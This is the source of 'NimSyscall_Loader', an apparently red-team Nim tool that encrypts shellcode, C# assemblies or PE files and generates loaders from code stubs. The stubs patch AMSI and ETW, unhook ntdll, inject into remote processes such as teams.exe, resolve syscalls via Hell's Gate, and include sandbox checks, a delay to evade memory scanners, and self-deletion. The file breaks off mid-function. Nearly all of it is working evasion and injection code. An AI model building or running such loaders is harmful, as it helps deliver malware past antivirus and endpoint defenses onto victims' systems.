#[

    Author: Fabian Mosch, Twitter: @ShitSecure
    Inspiration from: https://github.com/icyguider/nimcrypt/blob/main/nimcrypt.nim
]#

import nimcrypto
import nimcrypto/sysrand
import base64
import strformat
import strutils
import os
import osproc
import docopt
import std/math
import random
from system import io

func toByteSeq*(str: string): seq[byte] {.inline.} =
  ## Converts a string to the corresponding byte sequence.
  @(str.toOpenArrayByte(0, str.high))

proc toString(bytes: seq[byte]): string =
  result = newString(bytes.len)
  copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)

proc rndStr(length: int): string =
  for _ in .. length:
    add(result, char(rand(int('a') .. int('z'))))


let banner = """
    _   ___          _____                       ____     __                    __         
   / | / (_)___ ___ / ___/__  ________________ _/ / /    / /   ____  ____ _____/ /__  _____
  /  |/ / / __ `__ \\__ \/ / / / ___/ ___/ __ `/ / /    / /   / __ \/ __ `/ __  / _ \/ ___/
 / /|  / / / / / / /__/ / /_/ (__  ) /__/ /_/ / / /    / /___/ /_/ / /_/ / /_/ /  __/ /    
/_/ |_/_/_/ /_/ /_/____/\__, /____/\___/\__,_/_/_/____/_____/\____/\__,_/\__,_/\___/_/     
                       /____/                   /_____/      --> @ShitSecure
                                                                 v1.1                                             
"""

echo banner

#Handle arguments

let helpmenu = """
NimSyscall_Loader v 1.1

Usage:
  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --remoteprocess=<processnames> --csharp --noAMSI --noETW --sleep=<10> --shellcode --COMVARETW --remoteinject --unhook --reflective --obfuscate --hide --noArgs --pe --hellsgate --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain>]
  NimSyscall_Loader (-h | --help)
  NimSyscall_Loader --version

Options:
  -h --help     Show this screen.
  --version     Show version.
  --file filename  File to encrypt.
  --key key     Key to encrypt with
  --output filename    Filename for encrypted exe
  --COMVARETW    Block ETW by setting COMPlus_ETWEnabled to 0
  --noETW    Don't use ETW Patch
  --noAMSI    Don't patch AMSI
  --csharp    Encrypt a C# Assembly to load it on runtime
  --noArgs    Don't provide any arguments to the assembly (some can only run without args)
  --shellcode    Encrypt shellcode to load it on runtime
  --sleep 10    Sleep 10 secconds before decryption to evade in memory scanners
  --remoteinject    Inject shellcode a newly spawned process (default notepad) / otherwise it's self injection
  --remoteprocess procname    Injects into the specified remote process name, e.g. teams.exe. The loader searches for the first process with that name
                     Can be used for multiple process names, e.g. --remoteprocess=teams.exe,iexplore.exe,MicrosoftEdge.exe -> First try teams, else Internet Explorer, last Edge
  --unhook    Unhook ntdll.dll before doing anything else for the current process
  --reflective    Set compiler flags, so that the Loader Nim binary can be reflectively loaded
  --obfuscate    Compile the Nim binary via Denim to make use of LLVM obfuscation (not possible in combination with --reflective)
  --hide    Compile with --app:gui flag, so that the console won't pop up
  --pe    Encrypt a PE to decrypt and run it on runtime as shellcode via donut
  --hellsgate    Retrieve Syscalls via Hellsgate technique (for patching AMSI/ETW or shellcode execution/PE injection)
  --replace    Replace common nim IOS's in the loader like the string 'nim'
  --sandbox Check1    Include Sandbox Checks of your choice into the loader
                      Domain -> Only execute if the target domain is == the --domain parameter's domain / If --domain is not set, it will only execute on non-domain joined systems
                      DomainJoined -> Only execute if the target is connected to ANY domain - you don't need to know the target's domain for this one
                      DiskSpace -> Only execute if c:\ disk space >= 200GB
                      MemorySpace -> Only execute if more than 4GB RAM available
  --domain targetdomain    Specify a domain for SandBox Evasion
  --self-delete    The loader deletes it's own executable on runtime (Credit to @byt3bl33d3r and @jonasLyk)
"""

if (paramCount() == 0):
    echo helpmenu
    quit(0)
if (paramStr(1) == "-h"):
    echo helpmenu
    quit(0)

var 
    filename: string = ""
    outfile: string = "Loader.exe"
    envkey: string = "TARGETDOMAIN"
    targetdomain: string = ""
    processname: string = ""
    sandboxcheckfmt: string = ""
    sandboxchecks: seq[string]
    sandbox: bool = false
    csharp: bool = false
    AMSI: bool = true
    ETW: bool = true
    COMVARETW: bool = false
    shellcode: bool = true
    localinject: bool = true
    unhook: bool = false
    denim: bool = false
    gosleep: bool = false
    reflective: bool = false
    hide: bool = false
    noArgs: bool = false
    pe: bool = false
    hellsgate: bool = false
    selfdelete: bool = false
    sleeptime: int = 0
    remoteprocess: string = ""
    remoteprocessesstring: string
    remoteprocesses: seq[string]
    replace: bool = false

let args = docopt(helpmenu, version = "NimSyscall_Loader 1.1")

if args["--file"]:
  let fname = args["--file"]
  filename = fmt"{fname}"
  echo filename

if args["--key"]:
  let keyname = args["--key"]
  envkey = fmt"{keyname}"

if args["--output"]:
  let outname = args["--output"]
  outfile = fmt"{outname}"

if args["--remoteprocess"]:
  let remoteprocessesstring = args["--remoteprocess"]
  processname = fmt"{remoteprocessesstring}"
  remoteprocesses = processname.split(',') 

if args["--csharp"]:
  csharp = true
  shellcode = false

if args["--noAMSI"]:
  AMSI = false

if args["--noETW"]:
  ETW = false

if args["--COMVARETW"]:
  COMVARETW = true

if args["--shellcode"]:
  shellcode = true

if args["--unhook"]:
  unhook = true

if args["--sleep"]:
  let sleeparg = args["--sleep"]
  sleeptime = parse_int($args["--sleep"])
  sleeptime = (sleeptime * 1000)
  gosleep = true

if args["--remoteinject"]:
  localinject = false

if args["--reflective"]:
  reflective = true

if args["--obfuscate"]:
  denim = true

if args["--hide"]:
  hide = true

if args["--noArgs"]:
  noArgs = true

if args["--pe"]:
  pe = true

if args["--hellsgate"]:
  hellsgate = true
  shellcode = false

if args["--replace"]:
  replace = true

if args["--sandbox"]:
  sandbox = true
  let sandboxchecksargs = args["--sandbox"]
  sandboxcheckfmt = fmt"{sandboxchecksargs}"
  sandboxchecks = sandboxcheckfmt.split(',') 

if args["--domain"]:
  let domainarg = args["--domain"]
  targetdomain = fmt"{domainarg}"

if args["--self-delete"]:
  selfdelete = true

var blob: string
#Read file and if PE convert to shellcode before
if (shellcode):
    if (pe):
        var exist: bool = existsFile("donut.exe")
        if (exist):
            discard os.execShellCmd(fmt"donut -f {filename} -o tmpshellcode.bin")
            blob = readFile("tmpshellcode.bin")
        else:
            echo fmt"'Donut.exe' not found. You need to download put it into the CWD: https://github.com/TheWover/donut"
    else:
        blob = readFile(filename)
else:
    blob = readFile(filename)

var
    data: seq[byte] = toByteSeq(blob)

    ectx: CTR[aes256]
    key: array[aes256.sizeKey, byte]
    iv: array[aes256.sizeBlock, byte]
    plaintext = newSeq[byte](len(data))
    enctext = newSeq[byte](len(data))

# Create Random IV
discard randomBytes(addr iv[0], 16)

# We do not need to pad data, `CTR` mode works byte by byte.
copyMem(addr plaintext[0], addr data[0], len(data))

# Expand key to 32 bytes using SHA256 as the KDF
var expandedkey = sha256.digest(envkey)
copyMem(addr key[0], addr expandedkey.data[0], len(expandedkey.data))

ectx.init(key, iv)
ectx.encrypt(plaintext, enctext)
ectx.clear()


#let encoded = encode(enctext)
echo "Writing encrypted blob to disk: "

var nameoffile: string = "enc.blob"
var content: string = cast[string](enctext)
writeFile("enc.blob", content)


let encodedIV = encode(iv)
let encodedenvkey = encode(envkey)

let RemoteProcImportStub = """
import osproc
"""

let SyscallStubSizeStub = """
var 
    SYSCALL_STUB_SIZE: int = 23;
"""

let SleepStub = fmt"""
#import std/math

echo obf("[*] Sleeping to avoid in memory scanners")
sleep(cast[int]({sleeptime})) 
"""

let DomainCheckStub = """

# code modified from here -> https://github.com/rominf/nim-hostname/blob/d517210adedf7f6c708393ddd20fd7a93504f262/src/hostname.nim
when defined(windows):
  # https://docs.microsoft.com/en-us/windows/win32/api/sysinfoapi/ne-sysinfoapi-computer_name_format
  const ComputerNameDnsDomain = 2
  # For testing purposes only
  const ComputerNameDnsFullyQualified = 3
elif defined(posix):
  import posix

proc getDomain*(): string {.tags: [ReadIOEffect].} =
  ## Returns domain name only.
  ## On Windows (see
  ## https://docs.microsoft.com/en-us/windows/win32/sysinfo/computer-names)
  ## returns ComputerNamePhysicalDnsHostname.
  # On POSIX SUSv2 guarantees that "Host names are limited to 255 bytes".
  # https://tools.ietf.org/html/rfc1035#section-2.3.1
  # https://tools.ietf.org/html/rfc2181#section-11
  const size = 256
  result = newString(size)
  when defined(windows):
    proc getComputerNameExA(nameType: cint, name: cstring, len: PDWORD): WINBOOL
      {.stdcall, dynlib: "kernel32", importc: "GetComputerNameExA", sideEffect.}
    var resultLen: DWORD = DWORD(size)
    let success = getComputerNameExA(ComputerNameDnsDomain,
                                     result.cstring, resultLen.addr) != 0
  elif defined(posix):
    let success = getDomain(result, size) == 0
    let resultLen = len(cstring(result))
  else:
    doAssert false, obf("getDomain failed: OS is not supported")
  if not success:
      echo obf("Failed to get Domain")
  result.setLen(resultLen)

"""

let DomainCheckStub1 = fmt"""
when isMainModule:
    var localdomain: string = getDomain()
    if(localdomain != "{targetdomain}"):
        echo obf("Domain not EQUAL, target / local :") & $localdomain & " / {targetdomain}"
        quit()
"""

let MemorySpaceStub = """

from winim import GlobalMemoryStatusEx,DWORD,MEMORYSTATUSEX

var statex: MEMORYSTATUSEX

proc MemoryCheck*(): bool =
    var gofurther: bool = false

    statex.dwLength = cast[DWORD](sizeof(statex))
    GlobalMemoryStatusEx(addr statex)
    var totalPhys = float(statex.ullTotalPhys) / float(1024*1024*1024)
    # If more than 4GB RAM available return true
    if(totalPhys >= 3.8):
        gofurther = true
        return gofurther
    else:
        return gofurther

when isMainModule:
    if (MemoryCheck() == false):
        echo obf("Not enough memory")
        quit()

"""


let DiskSpaceStub = """

from winim import GetDiskFreeSpaceEx,ULARGE_INTEGER,NTSTATUS
import winim/winstr

proc DiskSizeCheck*(): bool =

    var
        uliUserFree: ULARGE_INTEGER
        uliTotal: ULARGE_INTEGER
        uliRealFree: ULARGE_INTEGER
        success: NTSTATUS
        result: float
        gofurther: bool

    success = GetDiskFreeSpaceEx("C:\\",addr uliUserFree, addr uliTotal, addr uliRealFree)
    result = float(uliTotal.QuadPart) / float((1024*1024*1024))
    #echo "Size in GB: " & $result
    if(result >= 200):
        gofurther = true
        return gofurther
    else:
        return gofurther

when isMainModule:
    if (DiskSizeCheck() == false):
        echo obf("Disk too small")
        quit()

"""

let DomainJoinStub = """
# This will check for ANY domain join
from winim/com import GetObject
try:
    discard GetObject(obf("LDAP://RootDSE"))
except:
    quit()
finally:
    echo ""
"""

let FileDeleteStub = """

#[
    Author: Marcello Salvati, Twitter: @byt3bl33d3r, slight modifications by @ShitSecure
    License: BSD 3-Clause
    Credit to @jonasLyk for the discovery of this method and LloydLabs for the initial C PoC code.
    References:
        - https://github.com/LloydLabs/delete-self-poc
        - https://twitter.com/jonasLyk/status/1350401461985955840
]# 

# Don't want to import the everything from winim, only what's really needed
from winim import CreateFileW,RtlSecureZeroMemory,RtlCopyMemory,SetFileInformationByHandle,GetModuleFileNameW,CloseHandle,PathFileExistsW,PWCHAR,HANDLE,DELETE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,WINBOOL,FILE_RENAME_INFO,LPWSTR,DWORD,fileRenameInfo,FILE_DISPOSITION_INFO,TRUE
from winim import fileDispositionInfo,MAX_PATH,WCHAR,INVALID_HANDLE_VALUE

var DS_STREAM_RENAME = newWideCString(obf(":thiswontexist"))

proc ds_open_handle(pwPath: PWCHAR): HANDLE =
    return CreateFileW(pwPath, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0)

proc ds_rename_handle(hHandle: HANDLE): WINBOOL =
    var fRename: FILE_RENAME_INFO
    RtlSecureZeroMemory(addr fRename, sizeof(fRename))

    var lpwStream: LPWSTR = cast[LPWSTR](DS_STREAM_RENAME)
    fRename.FileNameLength = sizeof(lpwStream).DWORD;
    RtlCopyMemory(addr fRename.FileName, lpwStream, sizeof(lpwStream))

    return SetFileInformationByHandle(hHandle, fileRenameInfo, addr fRename, sizeof(fRename) + sizeof(lpwStream))

proc ds_deposite_handle(hHandle: HANDLE): WINBOOL =
    var fDelete: FILE_DISPOSITION_INFO
    RtlSecureZeroMemory(addr fDelete, sizeof(fDelete))

    fDelete.DeleteFile = TRUE;

    return SetFileInformationByHandle(hHandle, fileDispositionInfo, addr fDelete, sizeof(fDelete).cint)

when isMainModule:
    var
        wcPath: array[MAX_PATH + 1, WCHAR]
        hCurrent: HANDLE

    RtlSecureZeroMemory(addr wcPath[0], sizeof(wcPath));

    if GetModuleFileNameW(0, addr wcPath[0], MAX_PATH) == 0:
        echo obf("[-] Failed to get the current module handle")
        quit(QuitFailure)

    hCurrent = ds_open_handle(addr wcPath[0])
    if hCurrent == INVALID_HANDLE_VALUE:
        echo obf("[-] Failed to acquire handle to current running process")
        quit(QuitFailure)

    echo obf("[*] Attempting to rename file name")
    if not ds_rename_handle(hCurrent).bool:
        echo obf("[-] Failed to rename to stream")
        quit(QuitFailure)

    echo obf("[*] Successfully renamed file primary :$DATA ADS to specified stream, closing initial handle")
    CloseHandle(hCurrent)

    hCurrent = ds_open_handle(addr wcPath[0])
    if hCurrent == INVALID_HANDLE_VALUE:
        echo obf("[-] Failed to reopen current module")
        quit(QuitFailure)

    if not ds_deposite_handle(hCurrent).bool:
        echo obf("[-] Failed to set delete deposition")
        quit(QuitFailure)

    echo obf("[*] Closing handle to trigger deletion deposition")
    CloseHandle(hCurrent)

    if not PathFileExistsW(addr wcPath[0]).bool:
        echo obf("[*] File deleted successfully")

"""

let HellsgateStub = """

import winim/lean as winimport

{.passC:"-masm=intel".}

    #[
        Windows Undocumented Structures - Windows 7+
    ]#

type
    # https://doxygen.reactos.org/d3/d71/struct__ASSEMBLY__STORAGE__MAP__ENTRY.html
    ASSEMBLY_STORAGE_MAP {.pure.} = object
        Flags*      : winimport.ULONG
        DosPath*    : winimport.UNICODE_STRING
        Handle*     : winimport.HANDLE
    PASSEMBLY_STORAGE_MAP* = ptr ASSEMBLY_STORAGE_MAP

    LDR_DLL_LOAD_REASON* {.pure.} = enum
        LoadReasonUnknown                       = -1
        LoadReasonStaticDependency              = 0
        LoadReasonStaticForwarderDependency     = 1
        LoadReasonDynamicForwarderDependency    = 2
        LoadReasonDelayloadDependency           = 3
        LoadReasonDynamicLoad                   = 4
        LoadReasonAsImageLoad                   = 5
        LoadReasonAsDataLoad                    = 6
        LoadReasonEnclavePrimary                = 7
        LoadReasonEnclaveDependency             = 8

    RTL_BALANCED_NODE_STRUCT1* {.pure.} = object
        Left* : PRTL_BALANCED_NODE
        Right* : PRTL_BALANCED_NODE

    RTL_BALANCED_NODE_UNION1* {.pure, union.} = object
        Children* : array[2, PRTL_BALANCED_NODE]
        Struct1*  : RTL_BALANCED_NODE_STRUCT1

    RTL_BALANCED_NODE_UNION2* {.pure, union.} = object
        Red*        {.bitsize:1.}   : winimport.UCHAR
        Balance*    {.bitsize:2.}   : winimport.UCHAR
        ParentValue*                : winimport.ULONG_PTR

    RTL_BALANCED_NODE* {.pure.} = object
        Union1* : RTL_BALANCED_NODE_UNION1
        Union2* : RTL_BALANCED_NODE_UNION2
    PRTL_BALANCED_NODE* = ptr RTL_BALANCED_NODE

    LDR_DATA_TABLE_ENTRY_UNION_ONE* {.pure, union.} = object
        InInitializationOrderLinks*  : winimport.LIST_ENTRY
        InProgressLinks*             : winimport.LIST_ENTRY
    PLDR_DATA_TABLE_ENTRY_UNION_ONE* = ptr LDR_DATA_TABLE_ENTRY_UNION_ONE

    LDR_DATA_TABLE_ENTRY_STRUCT_ONE* {.pure.} = object
        PackagedBinary* {.bitsize:1.}           : winimport.ULONG
        MarkedForRemoval* {.bitsize:1.}         : winimport.ULONG
        ImageDll* {.bitsize:1.}                 : winimport.ULONG
        LoadNotificationSent* {.bitsize:1.}     : winimport.ULONG
        TelemetryEntryProcessed* {.bitsize:1.}  : winimport.ULONG
        ProcessStaticImport* {.bitsize:1.}      : winimport.ULONG
        InLegacyLists* {.bitsize:1.}            : winimport.ULONG
        InIndexes* {.bitsize:1.}                : winimport.ULONG
        ShimDll* {.bitsize:1.}                  : winimport.ULONG
        InExceptionTable* {.bitsize:1.}         : winimport.ULONG
        ReservedFlags1* {.bitsize:2.}           : winimport.ULONG
        LoadInProgress* {.bitsize:1.}           : winimport.ULONG
        LoadConfigProcessed* {.bitsize:1.}      : winimport.ULONG
        EntryProcessed* {.bitsize:1.}           : winimport.ULONG
        ProtectDelayLoad* {.bitsize:1.}         : winimport.ULONG
        ReservedFlags3* {.bitsize:2.}           : winimport.ULONG
        DontCallForThreads* {.bitsize:1.}       : winimport.ULONG
        ProcessAttachCalled* {.bitsize:1.}      : winimport.ULONG
        ProcessAttachFailed* {.bitsize:1.}      : winimport.ULONG
        CorDeferredValidate* {.bitsize:1.}      : winimport.ULONG
        CorImage* {.bitsize:1.}                 : winimport.ULONG
        DontRelocate {.bitsize:1.}              : winimport.ULONG
        CorILOnly* {.bitsize:1.}                : winimport.ULONG
        ChpeImage* {.bitsize:1.}                : winimport.ULONG
        ReservedFlags5* {.bitsize:2.}           : winimport.ULONG
        Redirected* {.bitsize:1.}               : winimport.ULONG
        ReservedFlags6* {.bitsize:2.}           : winimport.ULONG
        CompatDatabaseProcessed* {.bitsize:1.}  : winimport.ULONG

    LDR_DATA_TABLE_ENTRY_UNION_TWO* {.pure, union.} = object
        FlagGroup*   : array[4, winimport.UCHAR]
        Flags*       : winimport.ULONG
        Struct*      : LDR_DATA_TABLE_ENTRY_STRUCT_ONE            
    PLDR_DATA_TABLE_ENTRY_UNION_TWO* = ptr LDR_DATA_TABLE_ENTRY_UNION_TWO
    
    LDR_DATA_TABLE_ENTRY* {.pure.} = object
        InLoadOrderLinks*               : winimport.LIST_ENTRY
        InMemoryOrderLinks*             : winimport.LIST_ENTRY
        Union_1*                        : LDR_DATA_TABLE_ENTRY_UNION_ONE
        DLLBase*                        : winimport.PVOID
        EntryPoint*                     : winimport.PVOID
        SizeOfImage*                    : winimport.ULONG
        FullDllName*                    : winimport.UNICODE_STRING
        BaseDllName*                    : winimport.UNICODE_STRING
        Union_2*                        : LDR_DATA_TABLE_ENTRY_UNION_TWO
        ObsoleteLoadCount               : winimport.USHORT
        TlsIndex*                       : winimport.USHORT
        HashLinks*                      : winimport.LIST_ENTRY
        TimeDateStamp*                  : winimport.ULONG
        EntryPointActivationContext*    : winimport.PVOID
        Lock*                           : winimport.PVOID
        DdgagNode*                      : winimport.PVOID       # PLDR_DDAG_NODE
        NodeModuleLink*                 : winimport.LIST_ENTRY
        LoadContext*                    : winimport.PVOID       # PLDRP_LOAD_CONTEXT
        ParentDllBase                   : winimport.PVOID
        SwitchBackContext*              : winimport.PVOID
        BaseAddressIndexNode*           : RTL_BALANCED_NODE
        MappingInfoIndexNode*           : RTL_BALANCED_NODE
        OriginalBase*                   : winimport.ULONG_PTR
        LoadTime*                       : winimport.LARGE_INTEGER
        BaseNameHashValue*              : winimport.ULONG
        LoadReason*                     : LDR_DLL_LOAD_REASON
        ImplicitPathOptions*            : winimport.ULONG
        ReferenceCount*                 : winimport.ULONG
        DependentLoadFlags*             : winimport.ULONG
        SigningLevel*                   : winimport.UCHAR
    PLDR_DATA_TABLE_ENTRY* = ptr LDR_DATA_TABLE_ENTRY

    PEB_LDR_DATA* {.pure.} = object
        Length*                             : winimport.ULONG
        Initialized*                        : winimport.BOOLEAN
        SsHandle*                           : winimport.PVOID
        InLoadOrderModuleList*              : winimport.LIST_ENTRY
        InMemoryOrderModuleList*            : winimport.LIST_ENTRY
        InInitializationOrderModuleList*    : winimport.LIST_ENTRY
        EntryInProgress*                    : winimport.PVOID
        ShutdownInProgress*                 : winimport.BOOLEAN
        ShutdownThreadId*                   : winimport.HANDLE
    PPEB_LDR_DATA* = ptr PEB_LDR_DATA

    PEB* {.pure.} = object
        InheritedAddressSpace*                  : winimport.BOOLEAN
        ReadImageFileExecOptions*               : winimport.BOOLEAN
        BeingDebugged*                          : winimport.BOOLEAN
        PebUnion1*                              : winimport.UCHAR
        Padding0*                               : array[4, winimport.UCHAR]
        Mutant*                                 : winimport.HANDLE
        ImageBaseAddress*                       : winimport.PVOID
        Ldr*                                    : PPEB_LDR_DATA                             
        ProcessParameters*                      : winimport.PRTL_USER_PROCESS_PARAMETERS  
        SubSystemData*                          : winimport.PVOID                         
        ProcessHeap*                            : winimport.HANDLE                        
        FastPebLock*                            : winimport.PVOID          # PRTL_CRITICAL_SECTION
        AtlThunkSListPtr*                       : winimport.PVOID                         
        IFEOKey*                                : winimport.PVOID                         
        PebUnion2*                              : winimport.ULONG                         
        Padding1*                               : array[4, winimport.UCHAR]               
        KernelCallBackTable*                    : ptr winimport.PVOID                     
        SystemReserved*                         : winimport.ULONG                         
        AltThunkSListPtr32*                     : winimport.ULONG                         
        ApiSetMap*                              : winimport.PVOID                         
        TlsExpansionCounter*                    : winimport.ULONG                         
        Padding2*                               : array[4, winimport.UCHAR]               
        TlsBitmap*                              : winimport.PVOID                         
        TlsBitmapBits*                          : array[2, winimport.ULONG]               
        ReadOnlyShareMemoryBase*                : winimport.PVOID                         
        SharedData*                             : winimport.PVOID                         
        ReadOnlyStaticServerData*               : ptr winimport.PVOID                     
        AnsiCodePageData*                       : winimport.PVOID                         
        OemCodePageData*                        : winimport.PVOID                         
        UnicodeCaseTableData*                   : winimport.PVOID                         
        NumberOfProcessors*                     : winimport.ULONG                         
        NtGlobalFlag*                           : winimport.ULONG                         
        CriticalSectionTimeout*                 : winimport.LARGE_INTEGER                 
        HeapSegmentReserve*                     : winimport.ULONG_PTR                     
        HeapSegmentCommit*                      : winimport.ULONG_PTR                     
        HeapDeCommitTotalFreeThreshold*         : winimport.ULONG_PTR                     
        HeapDeCommitFreeBlockThreshold*         : winimport.ULONG_PTR                     
        NumberOfHeaps*                          : winimport.ULONG                         
        MaximumNumberOfHeaps*                   : winimport.ULONG                         
        ProcessHeaps*                           : ptr winimport.PVOID                     
        GdiSharedHandleTable*                   : winimport.PVOID                         
        ProcessStarterHelper*                   : winimport.PVOID                         
        GdiDCAttributeList*                     : winimport.ULONG                         
        Padding3*                               : array[4, winimport.UCHAR]               
        LoaderLock*                             : winimport.PVOID           # PRTL_CRITICAL_SECTION
        OSMajorVersion*                         : winimport.ULONG
        OSMinorVersion*                         : winimport.ULONG
        OSBuildNumber*                          : winimport.USHORT
        OSCSDVersion*                           : winimport.USHORT
        OSPlatformId*                           : winimport.ULONG
        ImageSubsystem*                         : winimport.ULONG
        ImageSubsystemMajorVersion*             : winimport.ULONG
        ImageSubsystemMinorVersion*             : winimport.ULONG
        Padding4                                : array[4, winimport.UCHAR]
        ActiveProcessAffinityMask*              : winimport.PVOID            # KAFFINITY
        GdiHandleBuffer                         : array[0x3c, winimport.ULONG]
        PostProcessInitRoutine*                 : winimport.VOID
        TlsExpansionBitmap*                     : winimport.PVOID
        TlsExpansionBitmapBits*                 : array[0x20, winimport.ULONG]
        SessionId*                              : winimport.ULONG
        Padding5*                               : array[4, winimport.UCHAR]
        AppCompatFlags*                         : winimport.ULARGE_INTEGER
        AppCompatFlagsUser*                     : winimport.ULARGE_INTEGER
        ShimData*                               : winimport.PVOID
        AppCompatInfo*                          : winimport.PVOID
        CSDVersion*                             : winimport.UNICODE_STRING
        ActivationContextData*                  : winimport.PVOID             # PACTIVATION_CONTEXT_DATA 
        ProcessAssemblyStorageMap*              : winimport.PVOID             # PASSEMBLY_STORAGE_MAP
        SystemDefaultActivationContextData*     : winimport.PVOID             # PACTIVATION_CONTEXT_DATA
        SystemAssemblyStorageMap*               : winimport.PVOID             # PASSEMBLY_STORAGE_MAP
        MinimumStackCommit*                     : winimport.ULONG_PTR
        Sparepointers*                          : array[4, winimport.PVOID]
        SpareUlongs*                            : array[5, winimport.ULONG]
        WerRegistrationData*                    : winimport.PVOID
        WerShipAssertPtr*                       : winimport.PVOID
        Unused*                                 : winimport.PVOID
        ImageHeaderHash*                        : winimport.PVOID
        TracingFlags*                           : winimport.ULONG
        CsrServerReadOnlySharedMemoryBase*      : winimport.ULONGLONG
        TppWorkerpListLock*                     : winimport.ULONG
        TppWorkerpList*                         : winimport.LIST_ENTRY
        WaitOnAddressHashTable*                 : array[0x80, winimport.PVOID]
        TelemtryCoverageHeader*                 : winimport.PVOID
        CloudFileFlags*                         : winimport.ULONG
        CloudFileDiagFlags*                     : winimport.ULONG
        PlaceholderCompatabilityMode*           : winimport.CHAR
        PlaceholderCompatabilityModeReserved*   : array[7, winimport.CHAR]
        LeapSecondData*                         : winimport.PVOID
        LeapSecondFlags*                        : winimport.ULONG
        NtGlobalFlag2*                          : winimport.ULONG
    PPEB* = ptr PEB

    TEB* {.pure.} = object
        NtTib*                                  : winimport.NT_TIB
        EnvironmentPointer*                     : winimport.PVOID
        ClientId*                               : winimport.CLIENT_ID
        ActiveRpcHandle*                        : winimport.PVOID
        ThreadLocalStoragePointer*              : winimport.PVOID
        ProcessEnvironmentBlock*                : PEB
        LastErrorValue*                         : winimport.ULONG
        CountOfOwnedCriticalSections*           : winimport.ULONG
        CsrClientThread*                        : winimport.PVOID
        Win32ThreadInfo*                        : winimport.PVOID
        User32Reserved*                         : array[0x1A, winimport.ULONG]
        UserReserved*                           : array[5, winimport.ULONG]
        WOW32Reserved*                          : winimport.PVOID
        CurrentLocale*                          : winimport.ULONG
        FpSoftwareStatusRegister*               : winimport.ULONG
        ReservedForDebuggerInstrumentation*     : array[0x10, winimport.PVOID]
    PTEB* = ptr TEB

type
  PS_ATTR_UNION* {.pure, union.} = object
    Value*: ULONG
    ValuePtr*: PVOID
  PS_ATTRIBUTE* {.pure.} = object
    Attribute*: ULONG 
    Size*: SIZE_T
    u1*: PS_ATTR_UNION
    ReturnLength*: PSIZE_T
  PPS_ATTRIBUTE* = ptr PS_ATTRIBUTE
  PS_ATTRIBUTE_LIST* {.pure.} = object
    TotalLength*: SIZE_T
    Attributes*: array[2, PS_ATTRIBUTE]
  PPS_ATTRIBUTE_LIST* = ptr PS_ATTRIBUTE_LIST
  KNORMAL_ROUTINE* {.pure.} = object
    NormalContext*: PVOID
    SystemArgument1*: PVOID
    SystemArgument2*: PVOID
  PKNORMAL_ROUTINE* = ptr KNORMAL_ROUTINE




var syscall*  : WORD
type
    HG_TABLE_ENTRY* = object
        pAddress*    : PVOID
        dwHash*      : uint64
        wSysCall*    : WORD
    PHG_TABLE_ENTRY* = ptr HG_TABLE_ENTRY

proc djb2_hash*(pFuncName : string) : uint64 =

    var hash : uint64 = 0x5381

    for c in pFuncName:
        hash = ((hash shl 0x05) + hash) + cast[uint64](ord(c))

    return hash

proc moduleToBuffer*(pCurrentModule : PLDR_DATA_TABLE_ENTRY) : PWSTR =
    return pCurrentModule.FullDllName.Buffer

proc flinkToModule*(pCurrentFlink : LIST_ENTRY) : PLDR_DATA_TABLE_ENTRY =
    return cast[PLDR_DATA_TABLE_ENTRY](cast[ByteAddress](pCurrentFlink) - 0x10)

proc getExportTable*(pCurrentModule : PLDR_DATA_TABLE_ENTRY, pExportTable : var PIMAGE_EXPORT_DIRECTORY) : bool =

    let 
        pImageBase : PVOID              = pCurrentModule.DLLBase
        pDosHeader : PIMAGE_DOS_HEADER  = cast[PIMAGE_DOS_HEADER](pImageBase)
        pNTHeader : PIMAGE_NT_HEADERS = cast[PIMAGE_NT_HEADERS](cast[ByteAddress](pDosHeader) + pDosHeader.e_lfanew)

    if pDosheader.e_magic != IMAGE_DOS_SIGNATURE:
        return false

    if pNTHeader.Signature != cast[DWORD](IMAGE_NT_SIGNATURE):
        return false

    pExportTable = cast[PIMAGE_EXPORT_DIRECTORY](cast[ByteAddress](pImageBase) + pNTHeader.OptionalHeader.DataDirectory[0].VirtualAddress)

    return true

proc getTableEntry*(pImageBase : PVOID, pCurrentExportDirectory : PIMAGE_EXPORT_DIRECTORY, tableEntry : var HG_TABLE_ENTRY) : bool =

    var 
        cx : DWORD = 0
        numFuncs : DWORD = pCurrentExportDirectory.NumberOfNames
    let 
        pAddrOfFunctions    : ptr UncheckedArray[DWORD] = cast[ptr UncheckedArray[DWORD]](cast[ByteAddress](pImageBase) + pCurrentExportDirectory.AddressOfFunctions)
        pAddrOfNames        : ptr UncheckedArray[DWORD] = cast[ptr UncheckedArray[DWORD]](cast[ByteAddress](pImageBase) + pCurrentExportDirectory.AddressOfNames)
        pAddrOfOrdinals     : ptr UncheckedArray[WORD]  = cast[ptr UncheckedArray[WORD]](cast[ByteAddress](pImageBase) + pCurrentExportDirectory.AddressOfNameOrdinals)

    while cx < numFuncs:    
        var 
            pFuncOrdinal    : WORD      = pAddrOfOrdinals[cx]
            pFuncName       : string    = $(cast[PCHAR](cast[ByteAddress](pImageBase) + pAddrOfNames[cx]))
            funcHash        : uint64    = djb2_hash(pFuncName)
            funcRVA         : DWORD64   = pAddrOfFunctions[pFuncOrdinal]
            pFuncAddr       : PVOID     = cast[PVOID](cast[ByteAddress](pImageBase) + funcRVA)
        
        if funcHash == tableEntry.dwHash:

            tableEntry.pAddress = pFuncAddr
            if cast[PBYTE](cast[ByteAddress](pFuncAddr) + 3)[] == 0xB8:
                tableEntry.wSysCall = cast[PWORD](cast[ByteAddress](pFuncAddr) + 4)[]

            return true
        inc cx
    return false

proc GetPEBAsm64*(): PPEB {.asmNoStackFrame.} =
    asm ===
        mov rax, qword ptr gs:[0x60]
        ret
    ===

proc getNextModule*(flink : var LIST_ENTRY) : PLDR_DATA_TABLE_ENTRY =
    flink = flink.Flink[]
    return flinkToModule(flink)

proc searchLoadedModules*(pCurrentPeb : PPEB, tableEntry : var HG_TABLE_ENTRY) : bool =
    var 
        currFlink       : LIST_ENTRY                = pCurrentPeb.Ldr.InMemoryOrderModuleList.Flink[]
        currModule      : PLDR_DATA_TABLE_ENTRY     = flinkToModule(currFlink)                 
        moduleName      : string
        pExportTable    : PIMAGE_EXPORT_DIRECTORY
    let 
        beginModule = currModule
    
    while true:

        moduleName = $moduleToBuffer(currModule)

        if moduleName.len() == 0 or moduleName in paramStr(0):            
